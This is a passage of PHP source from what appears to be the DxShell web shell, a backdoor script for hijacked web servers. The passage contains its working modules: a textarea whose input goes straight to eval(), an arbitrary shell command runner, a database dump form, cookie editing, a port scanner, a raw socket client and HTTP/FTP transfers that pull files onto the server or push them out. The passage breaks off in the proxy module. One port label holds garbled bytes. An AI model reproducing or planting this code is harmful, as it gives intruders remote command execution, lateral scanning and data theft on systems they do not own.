	print "\n".'<tr><td width=1% class=h2_oneline style="vertical-align:top;">';

	DxMySQL_FetchResult(DxMySQLQ('SHOW TABLES;', true), $TABLES, true);
	for ($i=0;$i<count($TABLES);$i++) $TABLES[$i]=$TABLES[$i][0];
	asort($TABLES);

	print "\n\t".'<SELECT MULTIPLE name="dxsql_tables[]" SIZE=30>';
	for ($i=0;$i<count($TABLES);$i++)
		{
		DxMySQL_FetchResult(DxMySQLQ('SELECT COUNT(*) FROM `'.$TABLES[$i].'`;', true), $TRowCnt, true);
		if ($TRowCnt[0][0]>0)
			print "\n\t".'<OPTION value="'.$TABLES[$i].'" SELECTED>'.$TABLES[$i].'</OPTION>';
		}
	print "\n\t".'</SELECT>';
	print "\n".'</td><td  width=100%>You can set a pre-dump-query(s) (ex: SET NAMES cp1251; ):';
	print "\n".'<input type=text name="dxsql_q" style="width:100%;">';
	print "\n".'<br>';
	print "\n".'<div align=right>'
		.'GZIP <input type=checkbox name="dx_gzip" value="Yeah, baby">'.str_repeat('&nbsp;', 10)
		.'<input type=submit value="Dump!" class=submit style="width:100pt;"></div>';
	print "\n".'</form>';
	}

		###################################

########
########   PHP Console
########
if ($_GET['dxmode']=='PHP')
	{
	if (isset($_GET['dxval'])) $_POST['dxval']=$_GET['dxval'];

	print "\n".'<table border=0 align=right><tr><td class=h2_oneline>Do</td><td class="linelisting">';
	$PRESETS=array_keys($GLOB['VAR']['PHP']['Presets']);
	for ($i=0; $i<count($PRESETS);$i++)
		print "\n\t".'<a href="'.DxURL('leave', 'dxmode').'&dxval=dxpreset__'.$PRESETS[$i].'" class=no>['.$PRESETS[$i].']</a>'
						.(  ($i==(count($PRESETS)-1))?'':str_repeat('&nbsp;',3)  );
	print "\n\n".'</td></tr></table><br><br>';

	if (isset($_POST['dxval']))
		if (strpos($_POST['dxval'], 'dxpreset__')===0)
			{			$_POST['dxval']=substr($_POST['dxval'], strlen('dxpreset__'));
			if (!isset($GLOB['VAR']['PHP']['Presets'][$_POST['dxval']])) die(DxError('Undeclared preset'));
			$_POST['dxval']=$GLOB['VAR']['PHP']['Presets'][$_POST['dxval']];
			}

	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<textarea name="dxval" rows=15 style="width:100%;">'.((isset($_POST['dxval']))?$_POST['dxval']:'').'</textarea>';
	print "\n".'<div align=right><input type=submit value="Eval" class="submit" style="width:200pt;"></div>';
	print "\n".'</form>';
	if (isset($_POST['dxval']))
		{		print str_repeat("\n", 10).'<!--php_eval-->'."\n\n".'<table border=0 width=100%><tr><td class=listing>'."\n\n";
		eval($_POST['dxval']);
		print str_repeat("\n", 10).'<!--/php_eval-->'.'</td></tr></table>';
		}
	}

		###################################

########
########  Cookies Maintenance
########
if ($_GET['dxmode']=='COOK')
	{
	if ($DXGLOBALSHIT) DxWarning('Set cookie may fail. This is because "'.basename($_SERVER['PHP_SELF']).'" has fucked up the output with it\'s shit =(');	print 'Found <font class="highlight_txt">'.($CNT=count($_COOKIE)).' cookie'.(($CNT==1)?'':'s');

	print "\n".'<div align=right><a href="'.DxURL('leave', '').'">[RELOAD]</a></div>';

	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<table border=0 align=center><tr><td class=linelisting><div align=center><font class="highlight_txt">Cookie name</td><td class=linelisting><div align=center><font class="highlight_txt">Value</td></tr>';
	for ($look_len=1, $maxlen=0; $look_len>=0;$look_len--)
		{
		if ($maxlen>100) $maxlen=100;
		if ($maxlen<30) $maxlen=30;
		$maxlen+=3;
		for ($INDEXES=array_keys($_COOKIE), $i=0;$i<count($INDEXES);$i++)
			{
			if ($look_len) {if (strlen($_COOKIE[ $INDEXES[$i] ])>$maxlen) {$maxlen=strlen($_COOKIE[ $INDEXES[$i] ]);} continue;}
			print "\n".'<tr><td class=linelisting>'.$INDEXES[$i].'</td>'
					.'<td class=linelisting><input type=text '
							.'name="dxparam['.str_replace(array('"', "\n", "\r", "\t"),  array('&quot;',' ',' ',' '), $INDEXES[$i]).']" '
							.'value="'.str_replace(array('"', "\n", "\r", "\t"), array('&quot;',' ',' ',' '), $_COOKIE[ $INDEXES[$i] ]).'" '
							.'SIZE='.$maxlen.'></td>'
					.'</tr>';
			}
		if (!$look_len)
			{
			print "\n".'<tr><td colspan=2><div align=center>[Set new cookie]</td></tr>';
			print "\n".'<tr><td class=linelisting><input type=text name="dxparam[DXS_NEWCOOK][NAM]" value="" style="width:99%;"></td>'
					.'<td class=linelisting><input type=text name="dxparam[DXS_NEWCOOK][VAL]" value="" SIZE='.$maxlen.'></td>'
					.'</tr>';			print "\n".'<tr><td class=linelisting colspan=2 style="text-align:center;">'
					.'<input type=submit value="Save" class="submit" style="width:50%;">'
					.'</td></tr>';
			}
		}
	print "\n".'</table></form>';
	}

		###################################

########
########   Command line
########
if ($_GET['dxmode']=='CMD')
	{
	print "\n".'<table border=0 align=right><tr><td class=h2_oneline>Do</td><td>';
	print "\n".'<SELECT name="selector" onchange="document.getElementById(\'dxval\').value+=document.getElementById(\'selector\').value+\'\n\'" style="width:200pt;">';
	print "\n\t".'<OPTION></OPTION>';
	$PRESETS=array_keys($GLOB['VAR']['CMD']['Presets']);
	for ($i=0; $i<count($PRESETS);$i++)
		print "\n\t".'<OPTION value="'.str_replace('"','&quot;',$GLOB['VAR']['CMD']['Presets'][ $PRESETS[$i] ]).'">'.$PRESETS[$i].'</OPTION>';
	print "\n\n".'</SELECT></td></tr></table><br><br>';

	if (isset($_POST['dxval']))
		if (strpos($_POST['dxval'], 'dxpreset__')===0)
			{
			$_POST['dxval']=substr($_POST['dxval'], strlen('dxpreset__'));
			if (!isset($GLOB['VAR']['CMD']['Presets'][$_POST['dxval']])) die(DxError('Undeclared preset'));
			$_POST['dxval']=$GLOB['VAR']['CMD']['Presets'][$_POST['dxval']];
			}

	$warnstr=DxExecNahuj('',$trash1, $trash2);
	if (!$warnstr[1]) DxWarning($warnstr[2]);	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<textarea name="dxval" rows=5 style="width:100%;">'.((isset($_POST['dxval']))?$_POST['dxval']:'').'</textarea>';
	print "\n".'<div align=right>'
				.'<input type=submit value="Exec" class="submit" style="width:100pt;"> '
				.'</div>';
	print "\n".'</form>';
	if (isset($_POST['dxval']))
		{
		$_POST['dxval']=split("\n", str_replace("\r", '', $_POST['dxval']));
		for ($i=0; $i<count($_POST['dxval']); $i++)
			{
			$CUR=$_POST['dxval'][$i];
			if (empty($CUR)) continue;

			DxExecNahuj($CUR,$OUT, $RET);
			print str_repeat("\n", 10).'<!--'.$warnstr[2].'("'.$CUR.'")-->'."\n\n".'<table border=0 width=100%><tr><td class=listing>'."\n\n";

			print '<span style="position:absolute;left:10%;" class="highlight_txt">Return</span>';
			print '<span style="position:absolute;right:30%;" class="highlight_txt">Output</span>';
			print '<br><nobr>';
			print "\n".'<textarea rows=10 style="width:20%;display:inline;">'.$CUR."\n\n".(	(is_array($RET))?implode("\n", $RET):$RET).'</textarea>';
			print "\n".'<textarea rows=10 style="width:79%;display:inline;">'."\n".(	(is_array($OUT))?implode("\n", $OUT):$OUT).'</textarea>';
			print '</nobr>';
			print str_repeat("\n", 10).'<!--/'.$warnstr[2].'("'.$CUR.'")-->'."\n\n".'</td></tr></table>';
			}
		}
	}

		###################################

########
########   String functions
########
if ($_GET['dxmode']=='STR')
	{
	if (isset($_POST['dxval'], $_POST['dxparam']))
		{		$crypted='';
		if ($_POST['dxparam']=='md5') $crypted.=md5($_POST['dxval']);
		if ($_POST['dxparam']=='sha1') $crypted.=sha1($_POST['dxval']);
		if ($_POST['dxparam']=='crc32') $crypted.=crc32($_POST['dxval']);
		if ($_POST['dxparam']=='2base') $crypted.=base64_encode($_POST['dxval']);
		if ($_POST['dxparam']=='base2') $crypted.=base64_decode($_POST['dxval']);
		if ($_POST['dxparam']=='2HEX') for ($i=0;$i<strlen($_POST['dxval']);$i++) $crypted.=strtoupper(dechex(ord($_POST['dxval'][$i]))).' ';
		if ($_POST['dxparam']=='HEX2') {$_POST['dxval']=str_replace(' ','',$_POST['dxval']); for ($i=0;$i<strlen($_POST['dxval']);$i+=2) $crypted.=chr(hexdec($_POST['dxval'][$i].$_POST['dxval'][$i+1]));}
		if ($_POST['dxparam']=='2DEC') {$crypted='CHAR('; for ($i=0;$i<strlen($_POST['dxval']); $i++) $crypted.=ord($_POST['dxval'][$i]).(($i<(strlen($_POST['dxval'])-1))?',':')');}
		if ($_POST['dxparam']=='2URL') $crypted.=urlencode($_POST['dxval']);
		if ($_POST['dxparam']=='URL2') $crypted.=urldecode($_POST['dxval']);
		}
	if (isset($crypted)) print $_POST['dxparam'].'(<font class="highlight_txt"> '.$_POST['dxval'].' </font>) = ';
	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<textarea name="dxval" rows=20 style="width:100%;">'.((isset($crypted))?$crypted:'').'</textarea>';
	print "\n".'<div align=right>'
		.'<input type=submit name="dxparam" value="md5" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="sha1" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="crc32" class="submit" style="width:50pt;"> '.str_repeat('&nbsp;', 5)
		.'<input type=submit name="dxparam" value="2base" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="base2" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="2HEX" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="HEX2" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="2DEC" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="2URL" class="submit" style="width:50pt;"> '
		.'<input type=submit name="dxparam" value="URL2" class="submit" style="width:50pt;"> '
		.'</div>';
	print "\n".'</form>';
	}

########
########   Port scaner
########
if ($_GET['dxmode']=='PRT')
	{
	print '[!] For complete portlist go to <a href="http://www.iana.org/assignments/port-numbers" target=_blank>http://www.iana.org/assignments/port-numbers</a>';	if (isset($_POST['dxportscan']) or isset($_GET['dxparam']))
		$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Job Entry)',7=>'echo',9=>'discard',11=>'systat',13=>'daytime',15=>'netstat',17=>'quote of the day',18=>'send/rwp',19=>'character generator',20=>'ftp-data',21=>'ftp',22=>'ssh, pcAnywhere',23=>'Telnet',25=>'SMTP (Simple Mail Transfer)',27=>'ETRN (NSW User System FE)',29=>'MSG ICP',31=>'MSG Authentication',33=>'dsp (Display Support Protocol)',37=>'time',38=>'RAP (Route Access Protocol)',39=>'rlp (Resource Location Protocol)',41=>'Graphics',42=>'nameserv, WINS',43=>'whois, nickname',44=>'MPM FLAGS Protocol',45=>'Message Processing Module [recv]',46=>'MPM [default send]',47=>'NI FTP',48=>'Digital Audit Daemon',49=>'TACACS, Login Host Protocol',50=>'RMCP, re-mail-ck',53=>'DNS',57=>'MTP (any private terminal access)',59=>'NFILE',60=>'Unassigned',61=>'NI MAIL',62=>'ACA Services',63=>'whois++',64=>'Communications Integrator (CI)',65=>'TACACS-Database Service',66=>'Oracle SQL*NET',67=>'bootps (Bootstrap Protocol Server)',68=>'bootpd/dhcp (Bootstrap Protocol Client)',69=>'Trivial File Transfer Protocol (tftp)',70=>'Gopher',71=>'Remote Job Service',72=>'Remote Job Service',73=>'Remote Job Service',74=>'Remote Job Service',75=>'any private dial out service',76=>'Distributed External Object Store',77=>'any private RJE service',78=>'vettcp',79=>'finger',80=>'World Wide Web HTTP',81=>'HOSTS2 Name Serve',82=>'XFER Utility',83=>'MIT ML Device',84=>'Common Trace Facility',85=>'MIT ML Device',86=>'Micro Focus Cobol',87=>'any private terminal link',88=>'Kerberos, WWW',89=>'SU/MIT Telnet Gateway',90=>'DNSIX Securit Attribute Token Map',91=>'MIT Dover Spooler',92=>'Network Printing Protocol',93=>'Device Control Protocol',94=>'Tivoli Object Dispatcher',95=>'supdup',96=>'DIXIE',98=>'linuxconf',99=>'Metagram Relay',100=>'[unauthorized use]',101=>'HOSTNAME',102=>'ISO, X.400, ITOT',103=>'Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et',104=>'ACR-NEMA Digital Imag. & Comm. 300',105=>'CCSO name server protocol',106=>'poppassd',107=>'Remote Telnet Service',108=>'SNA Gateway Access Server',109=>'POP2',110=>'POP3',111=>'Sun RPC Portmapper',112=>'McIDAS Data Transmission Protocol',113=>'Authentication Service',115=>'sftp (Simple File Transfer Protocol)',116=>'ANSA REX Notify',117=>'UUCP Path Service',118=>'SQL Services',119=>'NNTP',120=>'CFDP',123=>'NTP',124=>'SecureID',129=>'PWDGEN',133=>'statsrv',135=>'loc-srv/epmap',137=>'netbios-ns',138=>'netbios-dgm (UDP)',139=>'NetBIOS',143=>'IMAP',144=>'NewS',150=>'SQL-NET',152=>'BFTP',153=>'SGMP',156=>'SQL Service',161=>'SNMP',175=>'vmnet',177=>'XDMCP',178=>'NextStep Window Server',179=>'BGP',180=>'SLmail admin',199=>'smux',210=>'Z39.50',213=>'IPX',218=>'MPP',220=>'IMAP3',256=>'RAP',257=>'Secure Electronic Transaction',258=>'Yak Winsock Personal Chat',259=>'ESRO',264=>'FW1_topo',311=>'Apple WebAdmin',350=>'MATIP type A',351=>'MATIP type B',363=>'RSVP tunnel',366=>'ODMR (On-Demand Mail Relay)',371=>'Clearcase',387=>'AURP (AppleTalk Update-Based Routing Protocol)',389=>'LDAP',407=>'Timbuktu',427=>'Server Location',434=>'Mobile IP',443=>'ssl',444=>'snpp, Simple Network Paging Protocol',445=>'SMB',458=>'QuickTime TV/Conferencing',468=>'Photuris',475=>'tcpnethaspsrv',500=>'ISAKMP, pluto',511=>'mynet-as',512=>'biff, rexec',513=>'who, rlogin',514=>'syslog, rsh',515=>'lp, lpr, line printer',517=>'talk',520=>'RIP (Routing Information Protocol)',521=>'RIPng',522=>'ULS',531=>'IRC',543=>'KLogin, AppleShare over IP',545=>'QuickTime',548=>'AFP',554=>'Real Time Streaming Protocol',555=>'phAse Zero',563=>'NNTP over SSL',575=>'VEMMI',581=>'Bundle Discovery Protocol',593=>'MS-RPC',608=>'SIFT/UFT',626=>'Apple ASIA',631=>'IPP (Internet Printing Protocol)',635=>'RLZ DBase',636=>'sldap',642=>'EMSD',648=>'RRP (NSI Registry Registrar Protocol)',655=>'tinc',660=>'Apple MacOS Server Admin',666=>'Doom',674=>'ACAP',687=>'AppleShare IP Registry',700=>'buddyphone',705=>'AgentX for SNMP',901=>'swat, realsecure',993=>'s-imap',995=>'s-pop',1024=>'Reserved',1025=>'network blackjack',1062=>'Veracity',1080=>'SOCKS',1085=>'WebObjects',1227=>'DNS2Go',1243=>'SubSeven',1338=>'Millennium Worm',1352=>'Lotus Notes',1381=>'Apple Network License Manager',1417=>'Timbuktu Service 1 Port',1418=>'Timbuktu Service 2 Port',1419=>'Timbuktu Service 3 Port',1420=>'Timbuktu Service 4 Port',1433=>'Microsoft SQL Server',1434=>'Microsoft SQL Monitor',1477=>'ms-sna-server',1478=>'ms-sna-base',1490=>'insitu-conf',1494=>'Citrix ICA Protocol',1498=>'Watcom-SQL',1500=>'VLSI License Manager',1503=>'T.120',1521=>'Oracle SQL',1522=>'Ricardo North America License Manager',1524=>'ingres',1525=>'prospero',1526=>'prospero',1527=>'tlisrv',1529=>'oracle',1547=>'laplink',1604=>'Citrix ICA, MS Terminal Server',1645=>'RADIUS Authentication',1646=>'RADIUS Accounting',1680=>'Carbon Copy',1701=>'L2TP/LSF',1717=>'Convoy',1720=>'H.323/Q.931',1723=>'PPTP control port',1731=>'MSICCP',1755=>'Windows Media .asf',1758=>'TFTP multicast',1761=>'cft-0',1762=>'cft-1',1763=>'cft-2',1764=>'cft-3',1765=>'cft-4',1766=>'cft-5',1767=>'cft-6',1808=>'Oracle-VP2',1812=>'RADIUS server',1813=>'RADIUS accounting',1818=>'ETFTP',1973=>'DLSw DCAP/DRAP',1985=>'HSRP',1999=>'Cisco AUTH',2001=>'glimpse',2049=>'NFS',2064=>'distributed.net',2065=>'DLSw',2066=>'DLSw',2106=>'MZAP',2140=>'DeepThroat',2301=>'Compaq Insight Management Web Agents',2327=>'Netscape Conference',2336=>'Apple UG Control',2427=>'MGCP gateway',2504=>'WLBS',2535=>'MADCAP',2543=>'sip',2592=>'netrek',2727=>'MGCP call agent',2628=>'DICT',2998=>'ISS Real Secure Console Service Port',3000=>'Firstclass',3001=>'Redwood Broker',3031=>'Apple AgentVU',3128=>'squid',3130=>'ICP',3150=>'DeepThroat',3264=>'ccmail',3283=>'Apple NetAssitant',3288=>'COPS',3305=>'ODETTE',3306=>'mySQL',3389=>'RDP Protocol (Terminal Server)',3521=>'netrek',4000=>'icq, command-n-conquer and shell nfm',4321=>'rwhois',4333=>'mSQL',4444=>'KRB524',4827=>'HTCP',5002=>'radio free ethernet',5004=>'RTP',5005=>'RTP',5010=>'Yahoo! Messenger',5050=>'multimedia conference control tool',5060=>'SIP',5150=>'Ascend Tunnel Management Protocol',5190=>'AIM',5500=>'securid',5501=>'securidprop',5423=>'Apple VirtualUser',5555=>'Personal Agent',5631=>'PCAnywhere data',5632=>'PCAnywhere',5678=>'Remote Replication Agent Connection',5800=>'VNC',5801=>'VNC',5900=>'VNC',5901=>'VNC',6000=>'X Windows',6112=>'BattleNet',6502=>'Netscape Conference',6667=>'IRC',6670=>'VocalTec Internet Phone, DeepThroat',6699=>'napster',6776=>'Sub7',6970=>'RTP',7007=>'MSBD, Windows Media encoder',7070=>'RealServer/QuickTime',7777=>'cbt',7778=>'Unreal',7648=>'CU-SeeMe',7649=>'CU-SeeMe',8000=>'iRDMI/Shoutcast Server',8010=>'WinGate 2.1',8080=>'HTTP',8181=>'HTTP',8383=>'IMail WWW',8875=>'napster',8888=>'napster',8889=>'Desktop Data TCP 1',8890=>'Desktop Data TCP 2',8891=>'Desktop Data TCP 3: NESS application',8892=>'Desktop Data TCP 4: FARM product',8893=>'Desktop Data TCP 5: NewsEDGE/Web application',8894=>'Desktop Data TCP 6: COAL application',9000=>'CSlistener',10008=>'cheese worm',11371=>'PGP 5 Keyserver',13223=>'PowWow',13224=>'PowWow',14237=>'Palm',14238=>'Palm',18888=>'LiquidAudio',21157=>'Activision',22555=>'Vocaltec Web Conference',23213=>'PowWow',23214=>'PowWow',23456=>'EvilFTP',26000=>'Quake',27001=>'QuakeWorld',27010=>'Half-Life',27015=>'Half-Life',27960=>'QuakeIII',30029=>'AOL Admin',31337=>'Back Orifice',32777=>'rpc.walld',45000=>'Cisco NetRanger postofficed',32773=>'rpc bserverd',32776=>'rpc.spray',32779=>'rpc.cmsd',38036=>'timestep',40193=>'Novell',41524=>'arcserve discovery',);

	if (isset($_GET['dxparam']))
		{		print "\n".'<table><tr><td class=listing colspan=2><h2>#Scan main will scan these '.count($DEF_PORTS).' ports:</td></tr>';
		$INDEXES=array_keys($DEF_PORTS);
		for ($i=0;$i<count($INDEXES);$i++)
			print "\n".'<tr><td width=40 class=listing style="text-align:right;">'.$INDEXES[$i].'</td><td class=listing>'.$DEF_PORTS[ $INDEXES[$i] ].'</td></tr>';
		print "\n".'</table>';
		die();
		}

	if (isset($_POST['dxportscan']))
		{		$OKAY_PORTS = 0;
		$TOSCAN=array();

		if ($_POST['dxportscan']['ports']=='#default') $TOSCAN=array_keys($DEF_PORTS);
			else
			{			$_POST['dxportscan']['ports']=explode(',',$_POST['dxportscan']['ports']);
			for ($i=0;$i<count($_POST['dxportscan']['ports']);$i++)
				{				$_POST['dxportscan']['ports'][$i]=explode('-',$_POST['dxportscan']['ports'][$i]);
				if (count($_POST['dxportscan']['ports'][$i])==1) $TOSCAN[]=$_POST['dxportscan']['ports'][$i][0];
					else
					$TOSCAN+=range($_POST['dxportscan']['ports'][$i][0], $_POST['dxportscan']['ports'][$i][1]);
				$_POST['dxportscan']['ports'][$i]=implode('-', $_POST['dxportscan']['ports'][$i]);
				}
			$_POST['dxportscan']['ports']=implode(',',$_POST['dxportscan']['ports']);
			}

		print "\n".'<table><tr><td colspan=2><font class="highlight_txt">Opened ports:</td></tr>';
		list($usec, $sec) = explode(' ', microtime());
		$start=(float)$usec + (float)$sec;
		for ($i=0;$i<count($TOSCAN);$i++)
			{			$cur_port=&$TOSCAN[$i];
			$fp=@fsockopen($_POST['dxportscan']['host'], $cur_port, $e, $e, (float)$_POST['dxportscan']['timeout']);
			if ($fp)
				{				$OKAY_PORTS++;
				$port_name='';
				if (isset($DEF_PORTS[$cur_port])) $port_name=$DEF_PORTS[$cur_port];
				print "\n".'<tr><td width=50 class=listing style="text-align:right;">'.$cur_port.'</td><td class=listing>'.$port_name.'</td><td class=listing>'.getservbyport($cur_port, 'tcp').'</td></tr>';
				}
			}
		list($usec, $sec) = explode(' ', microtime());
		$end=(float)$usec + (float)$sec;

		print "\n".'</table>';
		print "\n".'<font class="highlight_txt">Scanned '.count($TOSCAN).', '.$OKAY_PORTS.' opened. Time: '.($end-$start).'</font>';
		print "\n".'<br><hr>'."\n";
		}

	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<table border=0>'
		.'<tr>'
			.'<td colspan=2>'
			.'<input type=text name="dxportscan[host]" value="'.((isset($_POST['dxportscan']['host']))?$_POST['dxportscan']['host'].'"':'127.0.0.1"').' SIZE=30>'
			.'<input type=text name="dxportscan[timeout]" value="'.((isset($_POST['dxportscan']['timeout']))?$_POST['dxportscan']['timeout'].'"':'0.1"').' SIZE=10>'
		.'</tr><tr>'
			.'<td><textarea name="dxportscan[ports]" rows=3 cols=50>'.((isset($_POST['dxportscan']['ports']))?$_POST['dxportscan']['ports']:'21-25,35,80,3306').'</textarea>'
			.'</td><td>'
				.'<input type=checkbox name="dxportscan[ports]" value="#default"><a '.DxDesign_DrawBubbleBox('', 'To learn out what "main ports" are, click here', 300).' href="'.DxURL('kill','dxparam').'&dxparam=main_legend">#Scan main</a>'
				.'<br><input type=submit value="Scan" class="submit" style="width:100pt;">'
		.'</tr></table></form>';
	}

########
########   Raw s0cket
########
if ($_GET['dxmode']=='SOCK')
	{
	$DEFQUERY=DxHTTPMakeHeaders('GET', '/index.php?get=q&get2=d', 'www.microsoft.com', 'DxS Browser', 'http://referer.com/', array('post_val' => 'Yeap'), array('cookiename' => 'val'));
	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';	print "\n".'<table width=100% cellspacing=0 celpadding=0>';
	print "\n".'<tr><td class=linelisting colspan=2 width=100%><input type=text name="dxsock_host" value="'.( (isset($_POST['dxsock_host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'" style="width:100%;">';
	print "\n".'</td><td class=linelisting><nobr><input type=text name="dxsock_port" value="'.( (isset($_POST['dxsock_port'])?$_POST['dxsock_port']:'80') ).'" SIZE=10>'
			.' timeout <input type=text name="dxsock_timeout" value="'.( (isset($_POST['dxsock_timeout'])?$_POST['dxsock_timeout']:'1.0') ).'" SIZE=4></td></tr>';
	print "\n".'<tr><td class=linelisting colspan=3>'
			.'<textarea ROWS=15 name="dxsock_request" style="width:100%;">'.( (isset($_POST['dxsock_request'])?$_POST['dxsock_request']:$DEFQUERY) ).'</textarea>'
			.'</td></tr>';
	print "\n".'<tr>'
		.'<td class=linelisting width=50pt><input type=radio name="dxsock_type" value="HTML" '.( (isset($_POST['dxsock_type'])?	(($_POST['dxsock_type']=='HTML')?'CHECKED':'')	:'CHECKED') ).'>HTML</td>'
		.'<td class=linelisting width=50pt><input type=radio name="dxsock_type" value="TEXT" '.( (isset($_POST['dxsock_type'])?	(($_POST['dxsock_type']=='TEXT')?'CHECKED':'') :'') ).'>TEXT</td>'
		.'<td class=linelisting width=100%><div align=right><input type=submit class=submit value="Send" style="width:100pt;height:20pt;"></td>'
		.'</tr>';
	print "\n".'</table>';

	if (!isset($_POST['dxsock_host'], $_POST['dxsock_port'], $_POST['dxsock_timeout'], $_POST['dxsock_request'], $_POST['dxsock_type'])) die();

	print "\n".'<table width=100% cellspacing=0 celpadding=0>';
	print "\n".'<tr><td class=listing><pre><font class=highlight_txt>'.$_POST['dxsock_request'].'</font></pre></td></tr>';
	print "\n\n\n".'<tr><td class=listing>';

	$fp=@fsockopen($_POST['dxsock_host'], $_POST['dxsock_port'], $errno, $errstr, (float)$_POST['dxsock_timeout']);
	if (!$fp) die(DxError('Sock #'.$errno.' : '.$errstr));

	if ($_POST['dxsock_type']=='TEXT') print '<plaintext>';

	if (!empty($_POST['dxsock_request']))	fputs($fp, $_POST['dxsock_request']);
	$ret='';
	while (!feof($fp)) $ret.=fgets($fp, 4096 );
	fclose( $fp );

	if ($_POST['dxsock_type']=='HTML') $headers_over_place=strpos($ret,"\r\n\r\n"); else $headers_over_place=FALSE;

	if ($headers_over_place===FALSE)	print $ret;
		else print '<pre>'.substr($ret, 0, $headers_over_place).'</pre><br><hr><br>'.substr($ret, $headers_over_place);

	if ($_POST['dxsock_type']=='HTML') print "\n".'</td></tr></table>';
	}

########
########   FTP, HTTP file transfers
########
if ($_GET['dxmode']=='FTP')
	{	print "\n".'<table align=center width=100%><col span=3 align=right width=33%><tr><td align=center><font class="highlight_txt"><b>HTTP Download</td><td align=center><font class="highlight_txt"><b>FTP Download</td><td align=center><font class="highlight_txt"><b>FTP Upload</td></tr>';

	print "\n".'<tr><td>'; /* HTTP GET */
	print "\n\t".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n\t".'<input type=text name="DxFTP_HTTP" value="http://" style="width:100%;">';
	print "\n\t".'<input type=text name="DxFTP_FileTO" value="'.((isset($_GET['dxdir'])?$_GET['dxdir']:DxFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))).'/file.txt" style="width:100%;">';
	print "\n\t".'<input type=submit value="GET!" style="width:150pt;" class=submit></form>';
	print "\n".'</td><td>'; /* FTP DOWNL */
	print "\n\t".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n\t".'<input type=text name="DxFTP_FTP" value="ftp.host.com[:21]" style="width:100%;">';
	print "\n\t".'<nobr><b>Login:<input type=text name="DxFTP_USER" value="Anonymous" style="width:40%;"> / <input type=text name="DxFTP_PASS" value="" style="width:40%;"></b></nobr>';
	print "\n\t".'<input type=text name="DxFTP_FileOF" value="get.txt" style="width:100%;">';
	print "\n\t".'<input type=text name="DxFTP_FileTO" value="'.((isset($_GET['dxdir'])?$_GET['dxdir']:DxFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))).'/" style="width:100%;">';
	print "\n\t".'<br><nobr><input type=checkbox name="DxFTP_File_BINARY" value="YES">Enable binary mode</nobr>';
	print "\n\t".'<input type=submit name="DxFTP_DWN" value="Download!" style="width:150pt;" class=submit></form>';
	print "\n".'</td><td>'; /* FTP UPL */
	print "\n\t".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n\t".'<input type=text name="DxFTP_FTP" value="ftp.host.com[:21]" style="width:100%;">';
	print "\n\t".'<nobr><b>Login:<input type=text name="DxFTP_USER" value="Anonymous" style="width:40%;"> / <input type=text name="DxFTP_PASS" value="" style="width:40%;"></b></nobr>';
	print "\n\t".'<input type=text name="DxFTP_FileOF" value="'.((isset($_GET['dxdir'])?$_GET['dxdir']:DxFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))).'/file.txt'.'" style="width:100%;">';
	print "\n\t".'<input type=text name="DxFTP_FileTO" value="put.txt" style="width:100%;">';
	print "\n\t".'<br><nobr><input type=checkbox name="DxFTP_File_BINARY" value="YES">Enable binary mode</nobr>';
	print "\n\t".'<input type=submit name="DxFTP_UPL" value="Upload!" style="width:150pt;" class=submit></form>';
	print "\n".'</td></tr></table>';

	if (isset($_POST['DxFTP_HTTP']))		{		$URLPARSED=parse_url($_POST['DxFTP_HTTP']);		$request=DxHTTPMakeHeaders('GET', $URLPARSED['path'].'?'.$URLPARSED['query'], $URLPARSED['host']);
		if (!($f=@fsockopen($URLPARSED['host'], (empty($URLPARSED['port']))?80:$URLPARSED['port'], $errno, $errstr, 10))) die(DxError('Sock #'.$errno.' : '.$errstr));
		fputs($f, $request);

		$GETFILE='';
		while (!feof($f)) $GETFILE.=fgets($f, 4096 );
		fclose( $f );

		DxFiles_UploadHere($_POST['DxFTP_FileTO'], '', $GETFILE);
		}

	if (isset($_POST['DxFTP_DWN']) OR isset($_POST['DxFTP_UPL']))
		{		$DxFTP_SERV=explode(':',$_POST['DxFTP_FTP']);
		if(empty($DxFTP_SERV[1])) {$DxFTP_SERV=$DxFTP_SERV[0]; $DxFTP_PORT = 21;} else {$DxFTP_SERV=$DxFTP_SERV[0]; $DxFTP_PORT = (int)$DxFTP_SERV[1];}
		if (!($FTP=ftp_connect($DxFTP_SERV,$DxFTP_PORT,10))) die(DxError('No connection'));
		if (!ftp_login($FTP, $_POST['DxFTP_USER'], $_POST['DxFTP_PASS'])) die(DxError('Login failed'));
		if (isset($_POST['DxFTP_UPL']))
			if (!ftp_put($FTP, $_POST['DxFTP_FileTO'],$_POST['DxFTP_FileOF'], (isset($_POST['DxFTP_File_BINARY']))?FTP_BINARY:FTP_ASCII))
				die(DxError('Failed to upload'));  else print 'Upload OK';
		if (isset($_POST['DxFTP_DWN']))
			if (!ftp_get($FTP, $_POST['DxFTP_FileTO'],$_POST['DxFTP_FileOF'], (isset($_POST['DxFTP_File_BINARY']))?FTP_BINARY:FTP_ASCII))
				die(DxError('Failed to download')); else print 'Download OK';
		ftp_close($FTP);
		}
	}

########
########   HTTP Proxy
########
if ($_GET['dxmode']=='PROX')
	{
	print "\n\t".'<form action="'.DxURL('leave', '').'" method=POST>';	print "\n".'<table width=100% cellspacing=0>';
